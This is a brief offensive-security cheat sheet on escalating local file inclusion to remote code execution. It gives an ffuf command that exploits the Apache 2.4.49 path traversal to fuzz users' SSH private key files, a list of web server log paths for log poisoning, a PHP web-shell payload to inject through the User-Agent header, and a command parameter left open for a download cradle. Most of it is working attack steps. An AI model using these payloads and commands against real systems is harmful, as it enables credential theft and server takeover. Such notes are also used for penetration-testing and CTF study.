# LFI2RCE

## Via SSH Private Keys

We first need to grep `/etc/passwd` for home directories and create the wordlist `home_dirs.txt` for them.

We can then use the following wordlist to fuzz default private key names that SSH looks for.

**ssh_key_formats.txt**

```bash
.ssh/id_rsa
.ssh/id_ecdsa
.ssh/id_ecdsa_sk
.ssh/id_ed25519
.ssh/id_ed25519_sk
```

Example command with ffuf (exploiting apache 2.4.49):

```bash
ffuf -w home_dirs.txt:F1,ssh_key_formats.txt:F2 -u "http://$IP/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/F1/F2"
```

## Via Log Files

We can first use LFI to inspect the following paths:

```bash
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```

If we view these files and see values we control inside of them (such as the `User-Agent` header), we can gain RCE by injecting a PHP web route into said value.

In the case `User-Agent` is viewable, we can add the following PHP code to our `User-Agent` header when simply accessing the site normally:

```php
<?php system($_GET['cmd']); ?>
```

We can then make a request to the log files using the LFI to see if our injected PHP code is being rendered.

If the PHP code is not viewable, and only a space is seen, we know that PHP is being evaluated by the web server.

We can then obtain RCE by adding the following to our LFI request:

```bash
&cmd=<PS_CRADLE_HERE>
```
